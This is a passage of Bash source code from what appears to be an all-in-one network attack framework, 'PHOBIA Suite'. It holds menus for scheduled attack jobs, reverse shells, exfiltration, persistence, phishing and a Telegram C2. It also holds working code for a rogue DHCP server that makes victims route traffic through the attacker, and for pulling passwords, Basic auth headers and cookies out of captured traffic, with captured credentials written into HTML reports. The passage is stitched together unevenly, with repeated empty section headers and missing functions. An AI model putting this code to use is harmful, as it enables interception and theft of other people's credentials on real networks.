        [ $found -eq 0 ] && echo -e "${DIM}  (no jobs)${NC}"
    else
        echo -e "${DIM}  (no jobs directory)${NC}"
    fi
}

_sched_menu() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "S C H E D U L E R"
        phb_row "  Scheduled attack jobs (cron-backed)" "${DIM}${GREY}"
        phb_div
        phb_row "  -- CURRENT JOBS --" "${BOLD}${CYAN}"
        _sched_list
        phb_div
        phb_row "  [1]  Add job" "${BOLD}${GREEN}"
        phb_row "  [2]  Remove job" "${BOLD}${RED}"
        phb_row "  [3]  View job log" "${BOLD}${CYAN}"
        phb_row "  [4]  Run job now" "${BOLD}${GREEN}"
        phb_row "  [5]  List cron" "${DIM}${GREY}"
        phb_div
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "Choice: " SC
        case "$SC" in
            0) return ;;
            1)
                read -p "Job name: " n
                read -p "Schedule (cron expr, e.g. '0 3 * * *'): " w
                echo "Enter command (multi-line, end with EOF on its own line):"
                local cmd=""
                while IFS= read -r line; do
                    [ "$line" = "EOF" ] && break
                    cmd+="$line"$'\n'
                done
                _sched_add "$n" "$w" "$cmd"
                addon_wait ;;
            2)
                read -p "Job name to remove: " n
                _sched_remove "$n"
                addon_wait ;;
            3)
                read -p "Job name: " n
                n=$(echo "$n" | tr -c 'a-zA-Z0-9_-' '_')
                local log="$SCHED_DIR/$n.log"
                if [ -f "$log" ]; then
                    tail -50 "$log"
                else
                    echo -e "${YELLOW}[!] no log${NC}"
                fi
                addon_wait ;;
            4)
                read -p "Job name: " n
                n=$(echo "$n" | tr -c 'a-zA-Z0-9_-' '_')
                local f="$SCHED_JOBS/$n.sh"
                if [ -f "$f" ]; then
                    echo -e "${CYAN}[*] running $n...${NC}"
                    bash "$f"
                else
                    echo -e "${RED}[!] not found${NC}"
                fi
                addon_wait ;;
            5)
                crontab -l 2>/dev/null | grep -E "$SCHED_JOBS" 
                addon_wait ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# REPORTING ENGINE v1
# Generates an HTML report from the current session:
# creds (vault), scans, handshakes, shells, timeline.
# ===============================================================

_report_gen() {
    local out="${1:-}"
    [ -z "$out" ] && out="$(_sess_dir)/reports/report_$(date +%s).html"
    mkdir -p "$(dirname "$out")"

    local sess="${SESSION_NAME:-none}"
    local sdir="$(_sess_dir)"

    # gather data
    local creds_html=""
    if [ -f "$VAULT_DB" ] && command -v sqlite3 >/dev/null 2>&1; then
        creds_html=$(sqlite3 -html "$VAULT_DB" "SELECT ts,source,target,username,password FROM creds WHERE session='$sess' ORDER BY id DESC LIMIT 500;" 2>/dev/null)
    fi
    [ -z "$creds_html" ] && creds_html="<p><em>No credentials captured in this session.</em></p>"

    # scans
    local scans_html=""
    if [ -d "$sdir/scans" ]; then
        scans_html+="<ul>"
        while read -r f; do
            [ -z "$f" ] && continue
            local base; base=$(basename "$f")
            local sz; sz=$(du -h "$f" 2>/dev/null | awk '{print $1}')
            scans_html+="<li>$base ($sz)</li>"
        done < <(find "$sdir/scans" -type f 2>/dev/null | sort)
        scans_html+="</ul>"
    fi
    [ -z "$scans_html" ] && scans_html="<p><em>No scans in this session.</em></p>"

    # handshakes
    local hs_html=""
    if [ -d "$sdir/handshakes" ]; then
        hs_html+="<ul>"
        while read -r f; do
            [ -z "$f" ] && continue
            hs_html+="<li>$(basename "$f")</li>"
        done < <(find "$sdir/handshakes" -type f 2>/dev/null | sort)
        hs_html+="</ul>"
    fi
    [ -z "$hs_html" ] && hs_html="<p><em>No handshakes in this session.</em></p>"

    # shells
    local shells_html=""
    if [ -d "$sdir/shells" ]; then
        shells_html+="<ul>"
        while read -r f; do
            [ -z "$f" ] && continue
            shells_html+="<li>$(basename "$f")</li>"
        done < <(find "$sdir/shells" -type f 2>/dev/null | sort)
        shells_html+="</ul>"
    fi
    [ -z "$shells_html" ] && shells_html="<p><em>No shells in this session.</em></p>"

    # loot
    local loot_html=""
    if [ -d "$sdir/loot" ]; then
        loot_html+="<ul>"
        while read -r f; do
            [ -z "$f" ] && continue
            loot_html+="<li>$(basename "$f")</li>"
        done < <(find "$sdir/loot" -type f 2>/dev/null | sort)
        loot_html+="</ul>"
    fi
    [ -z "$loot_html" ] && loot_html="<p><em>No loot in this session.</em></p>"

    # build HTML
    cat > "$out" <<HTMLEOF
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PHOBIA Report — $sess</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
     background:#0d1117;color:#c9d1d9;margin:0;padding:40px;line-height:1.5}
h1,h2,h3{color:#f0f6fc;border-bottom:1px solid #30363d;padding-bottom:8px}
h1{color:#f85149}
h2{margin-top:40px}
table{border-collapse:collapse;width:100%;margin:16px 0}
th,td{border:1px solid #30363d;padding:8px 12px;text-align:left}
th{background:#161b22;color:#f0f6fc}
tr:nth-child(even){background:#0d1117}
tr:nth-child(odd){background:#161b22}
code{background:#161b22;padding:2px 6px;border-radius:4px;color:#7ee787}
.meta{color:#8b949e;font-size:13px;margin-bottom:24px}
.section{margin:24px 0;padding:16px;background:#161b22;border-radius:8px;border:1px solid #30363d}
ul{margin:8px 0;padding-left:24px}
li{margin:4px 0;color:#7ee787}
.badge{display:inline-block;background:#238636;color:#fff;padding:2px 10px;
       border-radius:12px;font-size:12px;font-weight:600}
</style>
</head>
<body>

<h1>PHOBIA Suite — Engagement Report</h1>
<p class="meta">
Session: <code>$sess</code><br>
Generated: $(date)<br>
Interface: <code>$INTERFACE</code> / monitor <code>$MONITOR_ACTUAL</code><br>
Session path: <code>$sdir</code>
</p>

<div class="section">
<h2>Summary</h2>
<p>
<span class="badge">Creds</span> see below &nbsp;
<span class="badge">Scans</span> see below &nbsp;
<span class="badge">Handshakes</span> see below &nbsp;
<span class="badge">Shells</span> see below
</p>
</div>

<div class="section">
<h2>Credentials</h2>
$creds_html
</div>

<div class="section">
<h2>Scans</h2>
$scans_html
</div>

<div class="section">
<h2>Handshakes</h2>
$hs_html
</div>

<div class="section">
<h2>Shells</h2>
$shells_html
</div>

<div class="section">
<h2>Loot</h2>
$loot_html
</div>

<p class="meta">
Generated by PHOBIA Suite v$SCRIPT_VERSION — @zeruaep
</p>

</body>
</html>
HTMLEOF

    echo -e "${GREEN}[+] Report: $out${NC}"

    # try to open in browser
    if command -v xdg-open >/dev/null 2>&1; then
        xdg-open "$out" >/dev/null 2>&1 &
    fi
}

_report_menu() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "R E P O R T I N G"
        phb_row "  Session: ${SESSION_NAME:-none}" "${BOLD}${CYAN}"
        phb_row "  Path:    $(_sess_dir)" "${DIM}${GREY}"
        phb_div
        phb_row "  [1]  Generate HTML report for current session" "${BOLD}${GREEN}"
        phb_row "  [2]  Generate + open in browser" "${BOLD}${GREEN}"
        phb_row "  [3]  List previous reports" "${BOLD}${CYAN}"
        phb_div
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "Choice: " RC
        case "$RC" in
            0) return ;;
            1) _report_gen; addon_wait ;;
            2) _report_gen; addon_wait ;;
            3) local rdir="$(_sess_dir)/reports"
               if [ -d "$rdir" ]; then
                   ls -la "$rdir" 2>/dev/null
               else
                   echo -e "${DIM}  no reports yet${NC}"
               fi
               addon_wait ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# LOCAL NETWORK MENU — with topology + session hooks
# ===============================================================
# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# TUNNELS MENU — with persistence + improved encoder
# ===============================================================
menu_tunnel() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "T U N N E L S   /   E X F I L"
        phb_row "  -- TUNNELS --" "${BOLD}${YELLOW}"
        phb_row "  [1]  Reverse shell generator" "${BOLD}${YELLOW}"
        phb_row "  [2]  Chisel tunnel"           "${BOLD}${YELLOW}"
        phb_row "  [3]  Ligolo-ng tunnel"        "${BOLD}${YELLOW}"
        phb_row "  [4]  DNS tunnel (iodine)"     "${BOLD}${YELLOW}"
        phb_row "  -- EXFIL --" "${BOLD}${RED}"
        phb_row "  [5]  Exfiltration"            "${BOLD}${RED}"
        phb_row "  -- FILE SERVE --" "${BOLD}${SKY}"
        phb_row "  [6]  Local HTTP server"       "${BOLD}${SKY}"
        phb_row "  -- PAYLOAD TOOLS --" "${BOLD}${MAGENTA}"
        phb_row "  [7]  Shell obfuscator"        "${BOLD}${MAGENTA}"
        phb_row "  [8]  Full payload encoder (all forms)" "${BOLD}${MAGENTA}"
        phb_row "  [9]  Generate persistence package" "${BOLD}${PINK}"
        phb_div
        phb_row "  [0]  Back"                    "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" TC
        case "$TC" in
            1) tunnel_reverse_shell ;;
            2) tunnel_chisel ;;
            3) tunnel_ligolo ;;
            4) tunnel_dns ;;
            5) addon_exfil ;;
            6) tunnel_local_http ;;
            7) tunnel_shell_obfuscate ;;
            8)
                read -p "Payload string: " pl
                [ -z "$pl" ] && { addon_wait; continue; }
                _payload_wrap "$pl" all
                addon_wait ;;
            9)
                read -p "LHOST (your IP): " plh
                plh="${plh:-$(ip -4 -o addr show | awk '$2!="lo" {print $4; exit}' | cut -d/ -f1)}"
                read -p "LPORT [4444]: " plp; plp="${plp:-4444}"
                _sess_or_init
                _persist_gen "$plh" "$plp"
                addon_wait ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
# ATTACK SURFACE — with new tools
# ===============================================================
menu_surface() {
    while true; do
        print_banner
        _compute_pad

        local cols
        cols=$(stty size 2>/dev/null | awk '{print $2}')
        [ -z "$cols" ] && cols=$(tput cols 2>/dev/null)
        [ -z "$cols" ] && cols=100
        [ "$cols" -lt 120 ] && cols=120

        # wide layout width — use ~90% of terminal, cap at 220
        local W=$(( cols - 20 ))
        [ $W -gt 220 ] && W=220
        [ $W -lt 100 ] && W=100
        local PAD=$(( (cols - W - 2) / 2 ))
        [ $PAD -lt 0 ] && PAD=0

        local top lin bot i
        top="+"; lin="+"; bot="+"
        for ((i=0;i<W;i++)); do top+="="; lin+="-"; bot+="="; done
        top+="+"; lin+="+"; bot+="+"

        local empty="|"
        for ((i=0;i<W;i++)); do empty+=" "; done
        empty+="|"

        # helpers
        _line() {  # full-width line with specified char
            local ch="$1"
            local s="+"
            for ((i=0;i<W;i++)); do s+="$ch"; done
            s+="+"
            printf "%*s" "$PAD" ""
            echo -e "${BOLD}${CYAN}${s}${NC}"
        }
        _empty() {
            printf "%*s" "$PAD" ""
            echo -e "${BOLD}${CYAN}${empty}${NC}"
        }
        _center() {
            local t="$1" c="${2:-}"
            local len; len=$(_plen "$t")
            local l=$(( (W - len) / 2 )); [ $l -lt 0 ] && l=0
            local r=$(( W - len - l )); [ $r -lt 0 ] && r=0
            printf "%*s" "$PAD" ""
            printf "${BOLD}${CYAN}|${NC}"
            printf "%*s" "$l" ""
            printf "%b%s${NC}" "$c" "$t"
            printf "%*s" "$r" ""
            printf "${BOLD}${CYAN}|${NC}
"
        }

        # 3-column row: content = 3 strings separated by tabs
        # each column gets W/3 width
        _3col() {
            local left="$1" mid="$2" right="$3"
            local cw=$(( W / 3 ))
            local c1=$cw
            local c2=$cw
            local c3=$(( W - c1 - c2 - 2 ))
            _pad_cell() {
                local txt="$1" w="$2"
                local vis
                vis=$(printf '%b' "$txt" | sed 's/\x1b\[[0-9;]*m//g')
                local l; l=$(_plen "$vis")
                local f=$(( w - l )); [ $f -lt 0 ] && f=0
                printf "%b" "$txt"
                printf "%*s" "$f" ""
            }
            printf "%*s" "$PAD" ""
            printf "${BOLD}${CYAN}|${NC}"
            _pad_cell "$left" "$c1"
            printf "${BOLD}${CYAN}|${NC}"
            _pad_cell "$mid" "$c2"
            printf "${BOLD}${CYAN}|${NC}"
            _pad_cell "$right" "$c3"
            printf "${BOLD}${CYAN}|${NC}"
            printf "\n"
        }

        # ---- top border ----
        _line "="
        _empty
        _center "◤  P H O B I A   —   v 6   —   A T T A C K   S U R F A C E  ◢" "${BOLD}${MAGENTA}"
        [ -n "$SESSION_NAME" ] && _center "session: $SESSION_NAME" "${GREEN}"
        _empty
        _line "-"

        # ---- section: WIRELESS / NETWORK / WEB ----
        _3col "  ${BOLD}${ORANGE}══════ W I R E L E S S ══════${NC}"               "  ${BOLD}${LIME}══════ N E T W O R K ══════${NC}"               "  ${BOLD}${VIOLET}══════ W E B   /   C L O U D ══════${NC}"
        _empty
        _3col "  ${BOLD}${ORANGE}[1]${NC}  WiFi attacks"               "  ${BOLD}${LIME}[4]${NC}  Local Network"               "  ${BOLD}${VIOLET}[7]${NC}  Website / DoS"
        _3col "     ${DIM}deauth, evil twin, WPS${NC}"               "     ${DIM}LAN scan, topology, tracker${NC}"               "     ${DIM}nikto, sqlmap, nuclei${NC}"
        _empty
        _3col "  ${BOLD}${ORANGE}[2]${NC}  Bluetooth attacks"               "  ${BOLD}${LIME}[5]${NC}  Active Directory"               "  ${BOLD}${VIOLET}[8]${NC}  Cloud / Containers"
        _3col "     ${DIM}BLE scan, L2CAP flood${NC}"               "     ${DIM}Kerberoast, AS-REP, relay${NC}"               "     ${DIM}docker, k8s, AWS${NC}"
        _empty
        _3col "  ${BOLD}${ORANGE}[3]${NC}  Wireless Extended"               "  ${BOLD}${LIME}[6]${NC}  Internal Services"               "  ${BOLD}${VIOLET}[9]${NC}  Tunnels / Exfil"
        _3col "     ${DIM}KARMA, WPA3, cellular${NC}"               "     ${DIM}msf, searchsploit, exploit${NC}"               "     ${DIM}shells, persistence, encoder${NC}"
        _empty
        _line "-"

        # ---- section: OPSEC / TOOLS / FRAMEWORK ----
        _3col "  ${BOLD}${RED}══════ O P S E C ══════${NC}"               "  ${BOLD}${CYAN}══════ T O O L S ══════${NC}"               "  ${BOLD}${MAGENTA}══════ F R A M E W O R K ══════${NC}"
        _empty
        _3col "  ${BOLD}${RED}[10]${NC} Live Attacks"               "  ${BOLD}${CYAN}[14]${NC} PyPhisher"               "  ${BOLD}${MAGENTA}[17]${NC} ${BOLD}${RED}AUTO-PWN ★${NC}"
        _3col "     ${DIM}threat maps, feeds${NC}"               "     ${DIM}phishing launcher${NC}"               "     ${DIM}one target, all attacks${NC}"
        _empty
        _3col "  ${BOLD}${RED}[11]${NC} IP Changer (Tor)"               "  ${BOLD}${CYAN}[15]${NC} OSINT"               "  ${BOLD}${MAGENTA}[18]${NC} Sessions"
        _3col "     ${DIM}rotate IP, MAC, proxy${NC}"               "     ${DIM}email, user, phone${NC}"               "     ${DIM}engagements, switches${NC}"
        _empty
        _3col "  ${BOLD}${RED}[12]${NC} Tunnel Setup"               "  ${BOLD}${CYAN}[16]${NC} MSF Auto"               "  ${BOLD}${MAGENTA}[19]${NC} Report + Vault"
        _3col "     ${DIM}ngrok, cloudflared${NC}"               "     ${DIM}scan + exploit search${NC}"               "     ${DIM}HTML report + creds${NC}"
        _empty
        _3col "  ${BOLD}${RED}[13]${NC} Custom Page Loader"               "  ${BOLD}${CYAN}[20]${NC} Check Updates"               "  ${BOLD}${MAGENTA}[21]${NC} Post-Exploit Kit"
        _3col "     ${DIM}serve captive pages${NC}"               "     ${DIM}reload script${NC}"               "     ${DIM}SAM dump, LSA, persist${NC}"
        _empty
        _line "-"

        # ---- section: N E W  M O D U L E S ----
                # ---- section: A R S E N A L  (split into 3) ----
        _3col "  ${BOLD}${LIME}══════ T O O L K I T ══════${NC}" \
              "  ${BOLD}${CYAN}══════ O F F E N S I V E ══════${NC}" \
              "  ${BOLD}${VIOLET}══════ E X T R A S ══════${NC}"
        _3col "  ${BOLD}${PINK}[22]${NC} Telegram C2"               "  ${BOLD}${MAGENTA}[24]${NC} Page Cloner"               "  ${BOLD}${MAGENTA}[26]${NC} SMB Crawler"
        _3col "     ${DIM}persistent agent${NC}"               "     ${DIM}clone real login pages${NC}"               "     ${DIM}enumerate + grep secrets${NC}"
        _empty
        _3col "  ${BOLD}${MAGENTA}[23]${NC} Hashcat Auto"               "  ${BOLD}${YELLOW}[25]${NC} Archive Cracker"               "  ${BOLD}${RED}[27]${NC} Cred Harvester"
        _3col "     ${DIM}auto-crack vault hashes${NC}"               "     ${DIM}ZIP / RAR / 7Z passwords${NC}"               "     ${DIM}passive NTLM capture${NC}"
        _empty
        _3col "  ${BOLD}${CYAN}[28]${NC} Kerberos Chain"               "  ${BOLD}${GREEN}[29]${NC} Show all modules"               "  ${BOLD}${GREY}[D]${NC}  ${WHITE}Debug Log${NC}"
        _3col "     ${DIM}AS-REP + Kerberoast${NC}"               "     ${DIM}list every feature${NC}"               "     ${DIM}quick reference${NC}"
        _empty
        _line "-"

        # ---- bottom row ----
        _3col "  ${BOLD}${RED}[0]${NC}  Exit"               "  ${BOLD}${CYAN}[99]${NC} Reload script"               "  ${BOLD}${GREY}[?]${NC}  ${WHITE}Help${NC}"
        _empty
        _line "="
        echo ""

        read -p "$(echo -e ${BOLD}${YELLOW}'  Choice: '${NC})" SURF
        loading_bar "Loading"
        case "$SURF" in
            1) wifi_ascii; wifi_main_entry ;;
            2) bt_ascii; menu_bluetooth ;;
            3) menu_wireless_ext ;;
            4) menu_lan ;;
            5) menu_ad ;;
            6) menu_internal ;;
            7) menu_web ;;
            8) menu_cloud ;;
            9) menu_tunnel ;;
            10) live_attacks_ascii; menu_live_attacks ;;
            11) ipchanger_ascii; menu_ip_changer ;;
            12) tunnel_menu ;;
            13) custom_page_menu ;;
            14) pyphisher_launch ;;
            15) osint_menu ;;
            16) addon_msf_run ;;
            17) menu_auto_pwn ;;
            18) _sess_list ;;
            19) _report_menu ;;
            20) surface_check_update ;;
            D|d) _phobia_debug_log ;;
            21) menu_post_exploit ;;
            22) menu_telegram_c2 ;;
            23) menu_hashcat_auto ;;
            24) menu_page_cloner ;;
            25) menu_archive_cracker ;;
            26) menu_smb_crawler ;;
            27) menu_cred_harvester ;;
            28) menu_kerberos_chain ;;
            29) _list_all_modules ;;
            99) surface_check_update ;;
            ?) _phobia_help ;;
            0) cleanup ;;
            *) sleep 1 ;;
        esac
    done
}

# helper — list every module
_list_all_modules() {
    print_banner
    menu_header "A L L   M O D U L E S"
    phb_row "  Numbered list of every phobia module:" "${BOLD}${CYAN}"
    phb_div
    phb_row "  [1]  WiFi attacks"          "${BOLD}${ORANGE}"
    phb_row "  [2]  Bluetooth attacks"     "${BOLD}${SKY}"
    phb_row "  [3]  Wireless Extended"     "${BOLD}${PINK}"
    phb_row "  [4]  Local Network"         "${BOLD}${LIME}"
    phb_row "  [5]  Active Directory"      "${BOLD}${RED}"
    phb_row "  [6]  Internal Services"     "${BOLD}${GOLD}"
    phb_row "  [7]  Website / DoS"         "${BOLD}${VIOLET}"
    phb_row "  [8]  Cloud / Containers"    "${BOLD}${TEAL}"
    phb_row "  [9]  Tunnels / Exfil"       "${BOLD}${YELLOW}"
    phb_row "  [10] Live Attacks"          "${BOLD}${RED}"
    phb_row "  [11] IP Changer (Tor)"      "${BOLD}${MAGENTA}"
    phb_row "  [12] Tunnel Setup"          "${BOLD}${SKY}"
    phb_row "  [13] Custom Page Loader"    "${BOLD}${SKY}"
    phb_row "  [14] PyPhisher"             "${BOLD}${VIOLET}"
    phb_row "  [15] OSINT"                 "${BOLD}${GREEN}"
    phb_row "  [16] MSF Auto"              "${BOLD}${RED}"
    phb_row "  [17] AUTO-PWN ★"            "${BOLD}${RED}"
    phb_row "  [18] Sessions"              "${BOLD}${CYAN}"
    phb_row "  [19] Report + Vault"        "${BOLD}${SKY}"
    phb_row "  [20] Check Updates"         "${BOLD}${CYAN}"
    phb_row "  [21] Post-Exploit Kit"      "${BOLD}${MAGENTA}"
    phb_row "  [22] Telegram C2"           "${BOLD}${PINK}"
    phb_row "  [23] Hashcat Auto"          "${BOLD}${MAGENTA}"
    phb_row "  [24] Page Cloner"           "${BOLD}${MAGENTA}"
    phb_row "  [25] Archive Cracker"       "${BOLD}${YELLOW}"
    phb_row "  [26] SMB Crawler"           "${BOLD}${MAGENTA}"
    phb_row "  [27] Cred Harvester"        "${BOLD}${RED}"
    phb_row "  [28] Kerberos Chain"        "${BOLD}${CYAN}"
    phb_row "  [29] This list"             "${BOLD}${CYAN}"
    phb_row "  [99] Reload script"         "${BOLD}${GREY}"
    phb_row "  [?]  Help"                  "${BOLD}${GREY}"
    phb_row "  [0]  Exit"                  "${BOLD}${RED}"
    menu_footer
    addon_wait
}

_phobia_help() {
    print_banner
    menu_header "H E L P"
    phb_row "  PHOBIA — all-in-one network attack framework" "${BOLD}${MAGENTA}"
    phb_div
    phb_row "  QUICK START:" "${BOLD}${CYAN}"
    phb_row "    1. pick [4] Local Network → scan a subnet" "${DIM}${GREY}"
    phb_row "    2. pick a host" "${DIM}${GREY}"
    phb_row "    3. pick [17] Auto-Pwn to run everything" "${DIM}${GREY}"
    phb_div
    phb_row "  TIPS:" "${BOLD}${CYAN}"
    phb_row "    - one Ctrl+C returns to menu" "${DIM}${GREY}"
    phb_row "    - two Ctrl+C within 3s quits" "${DIM}${GREY}"
    phb_row "    - all loot goes to $(_sess_dir)" "${DIM}${GREY}"
    phb_row "    - all creds go to the vault (see [19])" "${DIM}${GREY}"
    phb_div
    phb_row "  ONLY use against hosts you own or have permission to test." "${BOLD}${YELLOW}"
    menu_footer
    addon_wait
}


# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# ROGUE DHCP SERVER v1
# Beats the real router at handing out leases. Victims get YOU as
# their gateway + DNS, so all their traffic flows through your box.
# ===============================================================

ROGUE_DHCP_PID=""
ROGUE_DHCP_CONF="/tmp/phobia_rogue_dhcp.conf"
ROGUE_DHCP_LOG="/tmp/phobia_rogue_dhcp.log"

# silent runner — mutes parent shell stderr (no Killed spam)
_rdhcp_silent() {
    exec 9>&2 2>/dev/null
    "$@" >/dev/null 2>&1
    exec 2>&9 9>&-
}

# figure out subnet + our IP on the given interface
_rdhcp_info() {
    local iface="$1"
    RDHCP_IFACE="$iface"
    RDHCP_MYIP=$(ip -4 -o addr show "$iface" 2>/dev/null | awk '{print $4}' | head -1 | cut -d/ -f1)
    local cidr=$(ip -4 -o addr show "$iface" 2>/dev/null | awk '{print $4}' | head -1)
    local prefix="${cidr#*/}"
    [ -z "$prefix" ] && prefix=24
    local net="${RDHCP_MYIP%.*}"
    RDHCP_PREFIX="$prefix"
    RDHCP_SUBNET="${net}.0/${prefix}"
    RDHCP_RANGE_START="${net}.100"
    RDHCP_RANGE_END="${net}.200"
    RDHCP_NETMASK="255.255.255.0"
    if [ "$prefix" = "16" ]; then
        RDHCP_NETMASK="255.255.0.0"
    fi
    RDHCP_GW="$RDHCP_MYIP"
}

_rdhcp_stop() {
    _rdhcp_silent sudo pkill -9 -f "dnsmasq.*$ROGUE_DHCP_CONF"
    ROGUE_DHCP_PID=""
    local wan; wan=$(ip route show default 2>/dev/null | awk '/^default/ {print $5; exit}')
    [ -n "$wan" ] && _rdhcp_silent sudo iptables -t nat -D POSTROUTING -o "$wan" -j MASQUERADE
    _rdhcp_silent sudo iptables -D FORWARD -i "$RDHCP_IFACE" -o "$wan" -j ACCEPT
    _rdhcp_silent sudo iptables -D FORWARD -i "$wan" -o "$RDHCP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
    rm -f "$ROGUE_DHCP_CONF"
    echo -e "${GREEN}[+] stopped${NC}"
}

_rdhcp_live() {
    if [ -f "$ROGUE_DHCP_LOG" ]; then
        tail -f "$ROGUE_DHCP_LOG"
    else
        echo -e "${YELLOW}[!] no log yet — is the server running?${NC}"
    fi
}

_rdhcp_devices() {
    # show devices we've handed leases to
    if [ -f "$ROGUE_DHCP_LOG" ]; then
        grep -E "DHCPACK" "$ROGUE_DHCP_LOG" 2>/dev/null \
            | awk '{print $NF}' \
            | sort -u
    else
        echo -e "${DIM}no leases yet${NC}"
    fi
}

_rdhcp_menu() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "R O G U E   D H C P"
        phb_row "  Become the gateway for the whole subnet." "${DIM}${GREY}"
        phb_row "  Victims get YOU as gateway + DNS automatically." "${DIM}${GREY}"
        phb_div
        local status="stopped"
        pgrep -f "dnsmasq.*$ROGUE_DHCP_CONF" >/dev/null && status="running"
        phb_row "  Status:      $status" "$([ "$status" = "running" ] && echo "${BOLD}${GREEN}" || echo "${BOLD}${RED}")"
        [ -n "$RDHCP_IFACE" ] && phb_row "  Interface:   $RDHCP_IFACE" "${BOLD}${CYAN}"
        [ -n "$RDHCP_SUBNET" ] && phb_row "  Subnet:      $RDHCP_SUBNET" "${BOLD}${CYAN}"
        phb_div
        phb_row "  [1]  Start on $INTERFACE" "${BOLD}${GREEN}"
        phb_row "  [2]  Start on custom interface" "${BOLD}${GREEN}"
        phb_row "  [3]  Stop" "${BOLD}${RED}"
        phb_row "  [4]  Live log (see new devices)" "${BOLD}${CYAN}"
        phb_row "  [5]  List devices we've leased to" "${BOLD}${CYAN}"
        phb_div
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "Choice: " RC
        case "$RC" in
            0) return ;;
            1) _rdhcp_start "$INTERFACE"; addon_wait ;;
            2) read -p "Interface: " IF; [ -n "$IF" ] && _rdhcp_start "$IF"; addon_wait ;;
            3) _rdhcp_stop; addon_wait ;;
            4) _rdhcp_live ;;
            5) _rdhcp_devices; addon_wait ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# FULL MITM PROXY v1
# Sits behind ARP spoof / rogue DHCP. Watches all victim traffic.
# Captures URLs, credentials, cookies, logins.
# ===============================================================

MITM_LOG="$LOGS_DIR/mitm_capture.log"
MITM_CAPDIR="$LOGS_DIR/mitm_pcaps"
MITM_CREDS="$LOGS_DIR/mitm_creds.txt"
MITM_PID=""

_mitm_silent() {
    exec 9>&2 2>/dev/null
    "$@" >/dev/null 2>&1
    exec 2>&9 9>&-
}

_mitm_ensure() {
    mkdir -p "$MITM_CAPDIR"
    touch "$MITM_LOG" "$MITM_CREDS"
    # required tools
    for t in tcpdump; do
        command -v $t >/dev/null 2>&1 || {
            echo -e "${YELLOW}[!] installing $t...${NC}"
            sudo apt install -y "$t" >/dev/null 2>&1
        }
    done
}

# start passive capture on the attack interface
# parse captured pcaps for credentials + URLs
_mitm_analyze() {
    local pcap="${1:-$(cat /tmp/phobia_mitm_pcap 2>/dev/null)}"
    [ -z "$pcap" ] && pcap=$(ls -t "$MITM_CAPDIR"/*.pcap 2>/dev/null | head -1)
    if [ ! -f "$pcap" ]; then
        echo -e "${YELLOW}[!] no pcap found. Start capture first.${NC}"
        return 1
    fi
    _mitm_ensure

    echo ""
    echo -e "${BOLD}${CYAN}========= ANALYZING $pcap =========${NC}"

    # extract HTTP requests (URLs)
    echo -e "${BOLD}${YELLOW}--- HTTP Requests ---${NC}"
    sudo tcpdump -r "$pcap" -A 'tcp port 80 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' 2>/dev/null \
        | grep -E "^GET |^POST |^Host: " | head -50
    echo ""

    # extract credentials from POST bodies
    echo -e "${BOLD}${RED}--- Credentials (POST bodies) ---${NC}"
    sudo tcpdump -r "$pcap" -A 'tcp port 80' 2>/dev/null \
        | grep -iE "password=|passwd=|pwd=|user=|username=|login=|email=" \
        | grep -v "^Host:" \
        | sort -u \
        | head -50 \
        | tee -a "$MITM_CREDS"
    echo ""

    # extract basic auth headers
    echo -e "${BOLD}${YELLOW}--- Basic Auth Headers ---${NC}"
    sudo tcpdump -r "$pcap" -A 'tcp port 80 or tcp port 8080' 2>/dev/null \
        | grep -iE "Authorization: Basic" | head -20 | tee -a "$MITM_CREDS"
    echo ""

    # extract cookies
    echo -e "${BOLD}${YELLOW}--- Cookies ---${NC}"
    sudo tcpdump -r "$pcap" -A 'tcp port 80' 2>/dev/null \
        | grep -iE "^Cookie:" | head -30
    echo ""

    # extract User-Agents (device types)
    echo -e "${BOLD}${CYAN}--- Devices (User-Agent) ---${NC}"
    sudo tcpdump -r "$pcap" -A 'tcp port 80' 2>/dev/null \
        | grep -iE "^User-Agent:" | sort -u | head -20
    echo ""

    echo -e "${GREEN}[+] creds saved to $MITM_CREDS${NC}"
}

# sniffer view: live HTTP requests printed to screen
# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# WIRELESS EXTENDED MENU — Rogue DHCP added
# ===============================================================
menu_wireless_ext() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "W I R E L E S S   E X T E N D E D"
        phb_row "  -- WIRELESS --" "${BOLD}${PINK}"
        phb_row "  [1]  KARMA attack"          "${BOLD}${PINK}"
        phb_row "  [2]  WPA3 SAE DoS (mdk4)"    "${BOLD}${PINK}"
        phb_row "  [3]  Enterprise EAP capture" "${BOLD}${PINK}"
        phb_row "  -- HARDWARE / RADIO --" "${BOLD}${RED}"
        phb_row "  [4]  Cellular / SDR attacks" "${BOLD}${RED}"
        phb_row "  [5]  Physical access"        "${BOLD}${RED}"
        phb_row "  -- ROGUE NETWORK --" "${BOLD}${ORANGE}"
        phb_row "  [6]  Rogue DHCP server"      "${BOLD}${ORANGE}"
        phb_row "       become the gateway for the whole subnet" "${DIM}${GREY}"
        phb_div
        phb_row "  [0]  Back"                   "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" WC
        case "$WC" in
            1) wireless_karma ;;
            2) wireless_wpa3_flood ;;
            3) wireless_enterprise_creds ;;
            4) addon_cellular ;;
            5) addon_physical ;;
            6) _rdhcp_menu ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
